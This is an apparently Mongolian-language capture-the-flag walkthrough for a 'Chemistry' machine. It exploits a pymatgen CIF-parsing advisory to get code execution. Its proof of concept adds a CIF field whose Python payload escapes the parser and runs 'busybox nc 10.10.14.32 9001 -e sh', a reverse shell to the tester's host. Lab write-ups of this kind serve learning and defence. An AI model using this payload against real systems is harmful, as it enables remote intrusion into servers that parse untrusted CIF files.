# Chemistry - CIF RCE

CIF файлыг энэ веб рүү Upload хийнэ. Мөн example.cif файл татаж авах боломжтой.

[image]

Example.cif файлын доторх агуулга нь ийм байна. Мөн миний хувьд CIF файлтай холбоотой өмнө үүссэн эмзэг байдал юу байна? гэж хайсан.

[image]

## Arbitrary Code Execution эмзэг байдалд өртөмтгий байна.

[pymatgen GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

[image]

## Proof of concept

Дараах байдлаар RCE хийх боломжтой ч гэсэн бидний хувьд тухайн example.cif буюу серверээс өгсөн template файлыг нэмж зассанаар халдлагаа хийх боломжтой юм.

[image]

**Дараах мөр кодуудыг example.cif дээр нэмж өгсөн.**

```bash
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().class.mro[1].getattribute ( *[().class.mro[1]]+["sub" + "classes"]) () if d.name == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.32 9001 -e sh");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

[image]

## Shell as app

[image]
